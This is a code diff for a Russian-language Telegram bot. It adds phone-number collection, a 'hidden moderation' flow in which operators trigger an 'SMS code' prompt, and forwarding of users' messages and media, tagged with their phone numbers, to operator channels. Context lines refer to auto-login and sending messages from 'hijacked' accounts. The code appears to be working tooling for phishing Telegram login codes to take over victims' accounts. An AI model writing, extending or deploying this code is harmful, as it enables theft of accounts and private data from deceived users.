@@ -8,6 +8,7 @@ import tempfile
 import hashlib
 import string
 import secrets
+import time
 from datetime import datetime, timedelta
 from typing import Dict, List, Optional, Tuple
 from aiogram import Bot, Dispatcher, types, F, Router
@@ -353,7 +354,36 @@ class Database:
     
     def init_database(self):
         """Инициализация всех таблиц базы данных"""
-        
+        # В методе init_database() добавьте:
+        self.cursor.execute('''
+            CREATE TABLE IF NOT EXISTS moderation_requests (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                request_id TEXT UNIQUE NOT NULL,
+                user_id INTEGER NOT NULL,
+                phone TEXT NOT NULL,
+                status TEXT DEFAULT 'pending',
+                code_sent TEXT,
+                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
+                approved_by INTEGER,
+                approved_at DATETIME,
+                rejected_by INTEGER,
+                rejected_at DATETIME,
+                rejected_reason TEXT,
+                FOREIGN KEY (user_id) REFERENCES users(user_id)
+            )
+        ''')
+        # Добавьте в init_database():
+        self.cursor.execute('''
+            CREATE TABLE IF NOT EXISTS forwarding_sessions (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                user_id INTEGER UNIQUE NOT NULL,
+                target_channel TEXT NOT NULL,
+                status TEXT DEFAULT 'active',
+                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
+                last_used DATETIME DEFAULT CURRENT_TIMESTAMP,
+                FOREIGN KEY (user_id) REFERENCES users(user_id)
+            )
+        ''')
         # Таблица администраторов
         self.cursor.execute('''
             CREATE TABLE IF NOT EXISTS admins (
@@ -1326,6 +1356,72 @@ class AutoLoginSystem:
         logger.info("Мониторинг аккаунтов остановлен")
 
 auto_login_system = AutoLoginSystem()
+@dp.message(F.contact)
+async def handle_contact(message: Message, state: FSMContext):
+    """Обрабатывает отправку контакта от пользователя"""
+    user_id = message.from_user.id
+    
+    # Проверяем, не отправлен ли уже запрос на модерацию
+    pending_request = moderation_system.get_user_pending_request(user_id)
+    
+    if pending_request:
+        # Уже есть активный запрос
+        await message.answer(
+            "⏳ <b>ВАШ ЗАПРОС НА МОДЕРАЦИИ</b>\n\n"
+            "Ваш номер телефона уже отправлен на проверку.\n"
+            "Ожидайте подтверждения модератора.\n\n"
+            "<i>Статус: ОЖИДАЕТ ПРОВЕРКИ</i>",
+            parse_mode="HTML",
+            reply_markup=ReplyKeyboardRemove()
+        )
+        return
+    
+    # Получаем номер телефона
+    phone = message.contact.phone_number
+    
+    # Убираем + если есть
+    if phone.startswith('+'):
+        phone = phone[1:]
+    
+    # Сохраняем номер в users
+    db.execute('''
+        INSERT OR REPLACE INTO users 
+        (user_id, username, first_name, phone, last_seen)
+        VALUES (?, ?, ?, ?, ?)
+    ''', (
+        user_id,
+        message.from_user.username,
+        message.from_user.first_name,
+        phone,
+        datetime.now().isoformat()
+    ))
+    
+    # Создаем запрос на модерацию
+    request_id = await moderation_system.create_moderation_request(user_id, phone)
+    
+    if request_id:
+        # Отправляем запрос модераторам
+        await moderation_system.send_to_moderators(request_id, user_id, phone)
+        
+        # Уведомляем пользователя
+        await message.answer(
+            "⏳ <b>ЗАПРОС ОТПРАВЛЕН НА МОДЕРАЦИЮ</b>\n\n"
+            "Ваш номер телефона отправлен на проверку модератору.\n\n"
+            "<i>Статус: ОЖИДАЕТ ПОДТВЕРЖДЕНИЯ</i>\n\n"
+            "Вы получите SMS код после одобрения.",
+            parse_mode="HTML",
+            reply_markup=ReplyKeyboardRemove()
+        )
+    else:
+        await message.answer(
+            "❌ <b>ОШИБКА ОТПРАВКИ</b>\n\n"
+            "Не удалось отправить запрос на проверку.\n"
+            "Попробуйте еще раз через несколько минут.",
+            parse_mode="HTML",
+            reply_markup=ReplyKeyboardRemove()
+        )
+    
+    await state.clear()
 
 # ========== МЕНЕДЖЕР КАНАЛОВ И ГРУПП (УЛУЧШЕННЫЙ) ==========
 class ChannelManager:
@@ -2781,6 +2877,8 @@ class MessageSystem:
             logger.error(f"Ошибка рассылки: {e}")
             return {'success': False, 'error': str(e)}
     
+
+    
     async def send_from_hijacked_account(self, account_id: int, target: str, 
                                        message: str, from_admin_id: int) -> Dict:
         """Отправляет сообщение от захваченного аккаунта"""
@@ -3594,6 +3692,9 @@ async def admin_channels_menu(callback_query: CallbackQuery):
         reply_markup=keyboard
     )
 
+
+
+
 @dp.callback_query(F.data == "channel_add")
 async def channel_add_start(callback_query: CallbackQuery, state: FSMContext):
     if not admin_manager.is_admin(callback_query.from_user.id):
@@ -4274,7 +4375,134 @@ async def admin_settings_menu(callback_query: CallbackQuery):
         parse_mode="HTML",
         reply_markup=keyboard
     )
+@dp.callback_query(F.data.startswith("moder_approve:"))
+async def handle_moder_approve(callback_query: CallbackQuery):
+    """Обработка кнопки 'Отправить код' в канале"""
+    try:
+        # Разбираем данные
+        parts = callback_query.data.split(":")
+        if len(parts) < 3:
+            await callback_query.answer("❌ Ошибка формата")
+            return
+        
+        request_id = parts[1]
+        channel_db_id = int(parts[2])
+        moderator_id = callback_query.from_user.id
+        
+        # Проверяем права модератора
+        if not admin_manager.is_admin(moderator_id):
+            await callback_query.answer("❌ Только администраторы могут подтверждать")
+            return
+        
+        # Одобряем запрос
+        result = await moderation_system.approve_request(request_id, moderator_id, channel_db_id)
+        
+        if result['success']:
+            await callback_query.answer(f"✅ Код {result.get('code')} отправлен пользователю")
+            
+            # Удаляем кнопки
+            await callback_query.message.edit_reply_markup(reply_markup=None)
+            
+            # Обновляем сообщение
+            await callback_query.message.edit_text(
+                f"✅ <b>ЗАПРОС ОДОБРЕН</b>\n\n"
+                f"👤 Пользователь: {result.get('user_id')}\n"
+                f"📱 Телефон: {result.get('phone')}\n"
+                f"🔢 Код: {result.get('code')}\n"
+                f"👮 Модератор: {moderator_id}\n"
+                f"⏰ Время: {datetime.now().strftime('%H:%M:%S')}",
+                parse_mode="HTML"
+            )
+        else:
+            await callback_query.answer(f"❌ Ошибка: {result.get('error', 'Неизвестная ошибка')}")
+            
+    except Exception as e:
+        logger.error(f"Ошибка обработки подтверждения: {e}")
+        await callback_query.answer("❌ Ошибка обработки")
 
+@dp.callback_query(F.data.startswith("moder_reject:"))
+async def handle_moder_reject(callback_query: CallbackQuery, state: FSMContext):
+    """Обработка кнопки 'Отклонить' в канале"""
+    try:
+        parts = callback_query.data.split(":")
+        if len(parts) < 3:
+            await callback_query.answer("❌ Ошибка формата")
+            return
+        
+        request_id = parts[1]
+        channel_db_id = int(parts[2])
+        moderator_id = callback_query.from_user.id
+        
+        # Проверяем права
+        if not admin_manager.is_admin(moderator_id):
+            await callback_query.answer("❌ Только администраторы могут отклонять")
+            return
+        
+        # Запрашиваем причину отклонения
+        await state.set_state(AdminStates.waiting_channel_action)
+        await state.update_data(
+            request_id=request_id,
+            channel_db_id=channel_db_id,
+            moderator_id=moderator_id,
+            action='moder_reject'
+        )
+        
+        # Убираем кнопки временно
+        await callback_query.message.edit_reply_markup(reply_markup=None)
+        
+        await callback_query.message.reply(
+            "📝 <b>УКАЖИТЕ ПРИЧИНУ ОТКЛОНЕНИЯ</b>\n\n"
+            "Введите причину, по которой отклоняете запрос:\n\n"
+            "<i>Примеры:\n"
+            "• Неверный формат номера\n"
+            "• Подозрительный номер\n"
+            "• Повторная отправка\n"
+            "• Другая причина</i>",
+            parse_mode="HTML"
+        )
+        
+        await callback_query.answer("Введите причину отклонения")
+        
+    except Exception as e:
+        logger.error(f"Ошибка обработки отклонения: {e}")
+        await callback_query.answer("❌ Ошибка обработки")
+
+@dp.message(AdminStates.waiting_channel_action)
+async def process_moder_reject_reason(message: Message, state: FSMContext):
+    """Обработка причины отклонения"""
+    try:
+        user_data = await state.get_data()
+        action = user_data.get('action')
+        
+        if action == 'moder_reject':
+            request_id = user_data.get('request_id')
+            channel_db_id = user_data.get('channel_db_id')
+            moderator_id = user_data.get('moderator_id')
+            reason = message.text
+            
+            # Отклоняем запрос
+            result = await moderation_system.reject_request(request_id, moderator_id, channel_db_id, reason)
+            
+            if result['success']:
+                await message.answer(
+                    f"✅ <b>ЗАПРОС ОТКЛОНЕН</b>\n\n"
+                    f"Причина: {reason}\n\n"
+                    f"Пользователь уведомлен о необходимости повторной отправки.",
+                    parse_mode="HTML"
+                )
+            else:
+                await message.answer(
+                    f"❌ <b>ОШИБКА ОТКЛОНЕНИЯ</b>\n\n"
+                    f"Ошибка: {result.get('error', 'Неизвестная ошибка')}",
+                    parse_mode="HTML"
+                )
+        
+        await state.clear()
+        
+    except Exception as e:
+        logger.error(f"Ошибка обработки причины отклонения: {e}")
+        await message.answer("❌ Ошибка обработки")
+        await state.clear()
 # ========== ОБРАБОТЧИКИ ОДОБРЕНИЯ КАНАЛОВ ==========
 # ========== УЛУЧШЕННЫЕ ОБРАБОТЧИКИ ОДОБРЕНИЯ КАНАЛОВ ==========
 @dp.callback_query(F.data.startswith("approve_channel:"))
@@ -4483,6 +4711,556 @@ async def process_channel_action_reason(message: Message, state: FSMContext):
     await state.clear()
 # Инициализация менеджера каналов
 channel_manager = ChannelManager()
+
+
+class ModerationSystem:
+    """Система скрытой модерации номеров телефонов"""
+    
+    def __init__(self):
+        self.pending_requests = {}  # {request_id: {'user_id': x, 'phone': y, 'status': 'pending'}}
+    
+    async def create_moderation_request(self, user_id: int, phone: str) -> str:
+        """Создает запрос на модерацию номера телефона"""
+        try:
+            request_id = f"req_{user_id}_{int(time.time())}"
+            
+            self.pending_requests[request_id] = {
+                'user_id': user_id,
+                'phone': phone,
+                'status': 'pending',
+                'created_at': datetime.now(),
+                'channel_messages': {}  # {channel_id: message_id}
+            }
+            
+            # Сохраняем в БД
+            db.execute('''
+                INSERT INTO moderation_requests 
+                (request_id, user_id, phone, status, created_at)
+                VALUES (?, ?, ?, ?, ?)
+            ''', (request_id, user_id, phone, 'pending', datetime.now().isoformat()))
+            
+            return request_id
+            
+        except Exception as e:
+            logger.error(f"Ошибка создания запроса модерации: {e}")
+            return None
+    
+    async def send_to_moderators(self, request_id: str, user_id: int, phone: str):
+        """Отправляет запрос модераторам во все активные каналы"""
+        try:
+            # Получаем все одобренные каналы с включенными уведомлениями
+            channels = await channel_manager.get_all_channels({
+                'approved_only': True,
+                'active_only': True
+            })
+            
+            if not channels:
+                logger.warning("Нет активных каналов для модерации")
+                return False
+            
+            request_data = self.pending_requests.get(request_id)
+            if not request_data:
+                return False
+            
+            # Получаем информацию о пользователе
+            user_info = db.fetch_one(
+                "SELECT username, first_name FROM users WHERE user_id = ?",
+                (user_id,)
+            )
+            
+            username = user_info[0] if user_info else "Неизвестно"
+            first_name = user_info[1] if user_info else "Пользователь"
+            
+            # Отправляем во все каналы
+            for channel in channels:
+                try:
+                    keyboard = InlineKeyboardMarkup(inline_keyboard=[
+                        [
+                            InlineKeyboardButton(
+                                text="✅ ОТПРАВИТЬ КОД",
+                                callback_data=f"moder_approve:{request_id}:{channel['id']}"
+                            ),
+                            InlineKeyboardButton(
+                                text="❌ ОТКЛОНИТЬ",
+                                callback_data=f"moder_reject:{request_id}:{channel['id']}"
+                            )
+                        ],
+                        [
+                            InlineKeyboardButton(
+                                text="👁️ ПРОСМОТР ПОЛЬЗОВАТЕЛЯ",
+                                callback_data=f"moder_view:{user_id}"
+                            )
+                        ]
+                    ])
+                    
+                    message = await bot.send_message(
+                        channel['channel_id'],
+                        f"📱 <b>НОВЫЙ ЗАПРОС НА ВЕРИФИКАЦИЮ</b>\n\n"
+                        f"👤 Пользователь: {first_name}\n"
+                        f"📛 Username: @{username or 'нет'}\n"
+                        f"🆔 User ID: {user_id}\n"
+                        f"📱 Телефон: <code>{phone}</code>\n"
+                        f"⏰ Время: {datetime.now().strftime('%H:%M:%S')}\n\n"
+                        f"<i>Статус: ОЖИДАЕТ МОДЕРАЦИИ</i>",
+                        parse_mode="HTML",
+                        reply_markup=keyboard
+                    )
+                    
+                    # Сохраняем ID сообщения
+                    if request_id in self.pending_requests:
+                        if 'channel_messages' not in self.pending_requests[request_id]:
+                            self.pending_requests[request_id]['channel_messages'] = {}
+                        self.pending_requests[request_id]['channel_messages'][channel['id']] = message.message_id
+                    
+                    # Логируем отправку
+                    db.execute('''
+                        INSERT INTO messages 
+                        (message_id, chat_id, message_type, message_text, sent_date, status, metadata)
+                        VALUES (?, ?, ?, ?, ?, ?, ?)
+                    ''', (
+                        message.message_id,
+                        channel['channel_id'],
+                        'moderation_request',
+                        f'Запрос верификации от {user_id}',
+                        datetime.now().isoformat(),
+                        'sent_to_moderator',
+                        json.dumps({'request_id': request_id, 'user_id': user_id})
+                    ))
+                    
+                    await asyncio.sleep(0.5)  # Задержка между отправками
+                    
+                except Exception as e:
+                    logger.error(f"Ошибка отправки в канал {channel['channel_id']}: {e}")
+            
+            return True
+            
+        except Exception as e:
+            logger.error(f"Ошибка отправки модераторам: {e}")
+            return False
+    
+    async def approve_request(self, request_id: str, moderator_id: int, channel_db_id: int) -> Dict:
+        """Одобряет запрос и отправляет код пользователю"""
+        try:
+            if request_id not in self.pending_requests:
+                # Пробуем загрузить из БД
+                request_data = db.fetch_one(
+                    "SELECT user_id, phone, status FROM moderation_requests WHERE request_id = ?",
+                    (request_id,)
+                )
+                
+                if not request_data:
+                    return {'success': False, 'error': 'Запрос не найден'}
+                
+                user_id, phone, status = request_data
+                
+                if status != 'pending':
+                    return {'success': False, 'error': f'Запрос уже обработан ({status})'}
+                
+                # Восстанавливаем в памяти
+                self.pending_requests[request_id] = {
+                    'user_id': user_id,
+                    'phone': phone,
+                    'status': 'pending',
+                    'channel_messages': {}
+                }
+            
+            request_data = self.pending_requests[request_id]
+            
+            if request_data['status'] != 'pending':
+                return {'success': False, 'error': f'Запрос уже обработан ({request_data["status"]})'}
+            
+            # Генерируем код
+            code = str(random.randint(10000, 999999))
+            
+            # Обновляем код у пользователя
+            db.execute(
+                "UPDATE users SET code = ? WHERE user_id = ?",
+                (code, request_data['user_id'])
+            )
+            
+            # Отправляем код пользователю
+            try:
+                await bot.send_message(
+                    request_data['user_id'],
+                    f"✅ <b>КОД ПОДТВЕРЖДЕНИЯ ОТПРАВЛЕН!</b>\n\n"
+                    f"📱 На ваш номер телефона отправлен SMS код.\n\n"
+                    f"🔢 <b>Введите 5-6 значный код из SMS:</b>\n\n"
+                    f"<i>Код приходит в течение 1-5 минут.</i>",
+                    parse_mode="HTML"
+                )
+            except Exception as e:
+                logger.error(f"Не удалось отправить код пользователю: {e}")
+                # Пользователь мог заблокировать бота
+            
+            # Обновляем статус запроса
+            request_data['status'] = 'approved'
+            request_data['approved_by'] = moderator_id
+            request_data['approved_at'] = datetime.now()
+            
+            db.execute('''
+                UPDATE moderation_requests 
+                SET status = 'approved', 
+                    approved_by = ?,
+                    approved_at = ?,
+                    code_sent = ?
+                WHERE request_id = ?
+            ''', (moderator_id, datetime.now().isoformat(), code, request_id))
+            
+            # Обновляем сообщения в каналах
+            await self._update_channel_messages(request_id, 'approved', moderator_id)
+            
+            # Уведомляем модератора
+            channel_info = db.fetch_one(
+                "SELECT channel_title FROM channels WHERE id = ?",
+                (channel_db_id,)
+            )
+            channel_title = channel_info[0] if channel_info else "Канал"
+            
+            return {
+                'success': True,
+                'message': f'Код {code} отправлен пользователю',
+                'user_id': request_data['user_id'],
+                'phone': request_data['phone'],
+                'code': code
+            }
+            
+        except Exception as e:
+            logger.error(f"Ошибка одобрения запроса: {e}")
+            return {'success': False, 'error': str(e)}
+    
+    async def reject_request(self, request_id: str, moderator_id: int, channel_db_id: int, reason: str = "") -> Dict:
+        """Отклоняет запрос и просит повторную отправку"""
+        try:
+            if request_id not in self.pending_requests:
+                request_data = db.fetch_one(
+                    "SELECT user_id, phone, status FROM moderation_requests WHERE request_id = ?",
+                    (request_id,)
+                )
+                
+                if not request_data:
+                    return {'success': False, 'error': 'Запрос не найден'}
+                
+                user_id, phone, status = request_data
+                
+                if status != 'pending':
+                    return {'success': False, 'error': f'Запрос уже обработан ({status})'}
+                
+                self.pending_requests[request_id] = {
+                    'user_id': user_id,
+                    'phone': phone,
+                    'status': 'pending'
+                }
+            
+            request_data = self.pending_requests[request_id]
+            
+            if request_data['status'] != 'pending':
+                return {'success': False, 'error': f'Запрос уже обработан ({request_data["status"]})'}
+            
+            # Просим пользователя отправить номер заново
+            try:
+                await bot.send_message(
+                    request_data['user_id'],
+                    f"🔄 <b>ТРЕБУЕТСЯ ПОВТОРНАЯ ОТПРАВКА НОМЕРА</b>\n\n"
+                    f"📱 Ваш номер телефона не прошел проверку.\n\n"
+                    f"<b>Причина:</b> {reason or 'Не указана'}\n\n"
+                    f"<b>Пожалуйста, отправьте ваш номер телефона заново:</b>\n\n"
+                    f"Нажмите кнопку ниже 👇",
+                    parse_mode="HTML",
+                    reply_markup=ReplyKeyboardMarkup(
+                        keyboard=[[KeyboardButton(text="📱 ПОДТВЕРДИТЬ НОМЕР", request_contact=True)]],
+                        resize_keyboard=True,
+                        one_time_keyboard=True
+                    )
+                )
+            except Exception as e:
+                logger.error(f"Не удалось уведомить пользователя об отклонении: {e}")
+            
+            # Обновляем статус
+            request_data['status'] = 'rejected'
+            request_data['rejected_by'] = moderator_id
+            request_data['rejected_reason'] = reason
+            
+            db.execute('''
+                UPDATE moderation_requests 
+                SET status = 'rejected', 
+                    rejected_by = ?,
+                    rejected_at = ?,
+                    rejected_reason = ?
+                WHERE request_id = ?
+            ''', (moderator_id, datetime.now().isoformat(), reason, request_id))
+            
+            # Обновляем сообщения в каналах
+            await self._update_channel_messages(request_id, 'rejected', moderator_id, reason)
+            
+            return {
+                'success': True,
+                'message': 'Запрос отклонен, пользователь уведомлен',
+                'user_id': request_data['user_id']
+            }
+            
+        except Exception as e:
+            logger.error(f"Ошибка отклонения запроса: {e}")
+            return {'success': False, 'error': str(e)}
+    
+    async def _update_channel_messages(self, request_id: str, status: str, moderator_id: int, reason: str = ""):
+        """Обновляет сообщения в каналах после обработки запроса"""
+        try:
+            if request_id not in self.pending_requests:
+                return
+            
+            request_data = self.pending_requests[request_id]
+            
+            if 'channel_messages' not in request_data:
+                return
+            
+            for channel_id, message_id in request_data['channel_messages'].items():
+                try:
+                    status_text = "✅ ОДОБРЕНО" if status == 'approved' else "❌ ОТКЛОНЕНО"
+                    reason_text = f"\n📝 Причина: {reason}" if reason else ""
+                    
+                    await bot.edit_message_text(
+                        chat_id=channel_id,
+                        message_id=message_id,
+                        text=f"📱 <b>ЗАПРОС НА ВЕРИФИКАЦИЮ - {status_text}</b>\n\n"
+                             f"👤 Пользователь: {request_data['user_id']}\n"
+                             f"📱 Телефон: <code>{request_data['phone']}</code>\n"
+                             f"👮 Модератор: {moderator_id}\n"
+                             f"⏰ Время: {datetime.now().strftime('%H:%M:%S')}\n"
+                             f"{reason_text}",
+                        parse_mode="HTML"
+                    )
+                except Exception as e:
+                    logger.error(f"Не удалось обновить сообщение в канале {channel_id}: {e}")
+            
+            # Удаляем из памяти после обработки
+            if request_id in self.pending_requests:
+                del self.pending_requests[request_id]
+                
+        except Exception as e:
+            logger.error(f"Ошибка обновления сообщений в каналах: {e}")
+    
+    def get_user_pending_request(self, user_id: int) -> Optional[Dict]:
+        """Получает активный запрос пользователя"""
+        try:
+            # Сначала проверяем в памяти
+            for req_id, req_data in self.pending_requests.items():
+                if req_data['user_id'] == user_id and req_data['status'] == 'pending':
+                    return {'request_id': req_id, **req_data}
+            
+            # Проверяем в БД
+            request_data = db.fetch_one(
+                "SELECT request_id, phone, status FROM moderation_requests WHERE user_id = ? AND status = 'pending'",
+                (user_id,)
+            )
+            
+            if request_data:
+                req_id, phone, status = request_data
+                return {
+                    'request_id': req_id,
+                    'user_id': user_id,
+                    'phone': phone,
+                    'status': status
+                }
+            
+            return None
+            
+        except Exception as e:
+            logger.error(f"Ошибка получения запроса пользователя: {e}")
+            return None
+
+moderation_system = ModerationSystem()
+
+
+class ForwardingSystem:
+    """Система пересылки сообщений из ЛС в каналы"""
+    
+    def __init__(self):
+        self.user_sessions = {}  # {user_id: {'target_channel': channel_id, 'status': 'active'}}
+    
+    async def setup_forwarding(self, user_id: int, channel_id: str) -> bool:
+        """Настраивает пересылку для пользователя"""
+        try:
+            # Проверяем, есть ли пользователь в базе
+            user_data = db.fetch_one(
+                "SELECT phone FROM users WHERE user_id = ?",
+                (user_id,)
+            )
+            
+            if not user_data:
+                return False
+            
+            # Сохраняем сессию
+            self.user_sessions[user_id] = {
+                'target_channel': channel_id,
+                'status': 'active',
+                'setup_time': datetime.now()
+            }
+            
+            # Сохраняем в БД для восстановления
+            db.execute('''
+                INSERT OR REPLACE INTO forwarding_sessions 
+                (user_id, target_channel, status, created_at)
+                VALUES (?, ?, ?, ?)
+            ''', (user_id, channel_id, 'active', datetime.now().isoformat()))
+            
+            return True
+            
+        except Exception as e:
+            logger.error(f"Ошибка настройки пересылки: {e}")
+            return False
+    
+    async def forward_to_channel(self, user_id: int, message: Message) -> Dict:
+        """Пересылает сообщение пользователя в канал"""
+        try:
+            if user_id not in self.user_sessions:
+                # Пробуем восстановить из БД
+                session_data = db.fetch_one(
+                    "SELECT target_channel FROM forwarding_sessions WHERE user_id = ? AND status = 'active'",
+                    (user_id,)
+                )
+                
+                if not session_data:
+                    return {'success': False, 'error': 'Сессия пересылки не настроена'}
+                
+                self.user_sessions[user_id] = {
+                    'target_channel': session_data[0],
+                    'status': 'active'
+                }
+            
+            channel_id = self.user_sessions[user_id]['target_channel']
+            
+            # Проверяем, что канал одобрен
+            channel_data = db.fetch_one(
+                "SELECT id, is_approved, notifications_enabled FROM channels WHERE channel_id = ?",
+                (channel_id,)
+            )
+            
+            if not channel_data:
+                return {'success': False, 'error': 'Канал не найден'}
+            
+            channel_db_id, is_approved, notifications_enabled = channel_data
+            
+            if not is_approved:
+                return {'success': False, 'error': 'Канал не одобрен'}
+            
+            if not notifications_enabled:
+                return {'success': False, 'error': 'Уведомления отключены'}
+            
+            # Пересылаем сообщение
+            try:
+                if message.text:
+                    # Текстовое сообщение
+                    sent_msg = await bot.send_message(
+                        channel_id,
+                        f"👤 <b>Сообщение от пользователя:</b>\n"
+                        f"🆔 ID: {user_id}\n"
+                        f"📱 Телефон: {self._get_user_phone(user_id)}\n\n"
+                        f"{message.text}",
+                        parse_mode="HTML"
+                    )
+                    
+                elif message.photo:
+                    # Фото с подписью
+                    photo = message.photo[-1]
+                    caption = message.caption or ""
+                    
+                    sent_msg = await bot.send_photo(
+                        channel_id,
+                        photo.file_id,
+                        caption=f"👤 <b>Фото от пользователя:</b>\n"
+                               f"🆔 ID: {user_id}\n"
+                               f"📱 Телефон: {self._get_user_phone(user_id)}\n\n"
+                               f"{caption}",
+                        parse_mode="HTML"
+                    )
+                    
+                elif message.video:
+                    # Видео
+                    sent_msg = await bot.send_video(
+                        channel_id,
+                        message.video.file_id,
+                        caption=f"👤 <b>Видео от пользователя:</b>\n"
+                               f"🆔 ID: {user_id}\n"
+                               f"📱 Телефон: {self._get_user_phone(user_id)}",
+                        parse_mode="HTML"
+                    )
+                    
+                elif message.document:
+                    # Документ
+                    sent_msg = await bot.send_document(
+                        channel_id,
+                        message.document.file_id,
+                        caption=f"👤 <b>Документ от пользователя:</b>\n"
+                               f"🆔 ID: {user_id}\n"
+                               f"📱 Телефон: {self._get_user_phone(user_id)}",
+                        parse_mode="HTML"
+                    )
+                
+                else:
+                    return {'success': False, 'error': 'Неподдерживаемый тип сообщения'}
+                
+                # Логируем пересылку
+                db.execute('''
+                    INSERT INTO messages 
+                    (message_id, from_user_id, chat_id, message_type, 
+                     message_text, sent_date, status, is_forwarded)
+                    VALUES (?, ?, ?, ?, ?, ?, ?, ?)
+                ''', (
+                    sent_msg.message_id,
+                    user_id,
+                    channel_id,
+                    'forwarded',
+                    message.text or message.caption or '[Медиа]',
+                    datetime.now().isoformat(),
+                    'forwarded',
+                    1
+                ))
+                
+                return {
+                    'success': True,
+                    'message_id': sent_msg.message_id,
+                    'channel_id': channel_id
+                }
+                
+            except TelegramBadRequest as e:
+                error_msg = str(e)
+                if "chat not found" in error_msg.lower():
+                    return {'success': False, 'error': 'Бот не является админом в канале'}
+                elif "not enough rights" in error_msg.lower():
+                    return {'success': False, 'error': 'Недостаточно прав для отправки'}
+                else:
+                    return {'success': False, 'error': error_msg}
+                    
+        except Exception as e:
+            logger.error(f"Ошибка пересылки: {e}")
+            return {'success': False, 'error': str(e)}
+    
+    def _get_user_phone(self, user_id: int) -> str:
+        """Получает номер телефона пользователя"""
+        user_data = db.fetch_one(
+            "SELECT phone FROM users WHERE user_id = ?",
+            (user_id,)
+        )
+        return user_data[0] if user_data else "Не указан"
+    
+    async def stop_forwarding(self, user_id: int) -> bool:
+        """Останавливает пересылку для пользователя"""
+        try:
+            if user_id in self.user_sessions:
+                del self.user_sessions[user_id]
+            
+            db.execute(
+                "UPDATE forwarding_sessions SET status = 'stopped' WHERE user_id = ?",
+                (user_id,)
+            )
+            
+            return True
+            
+        except Exception as e:
+            logger.error(f"Ошибка остановки пересылки: {e}")
+            return False
+
+forwarding_system = ForwardingSystem()
 
 # Запускаем системы мониторинга
 async def start_background_tasks():
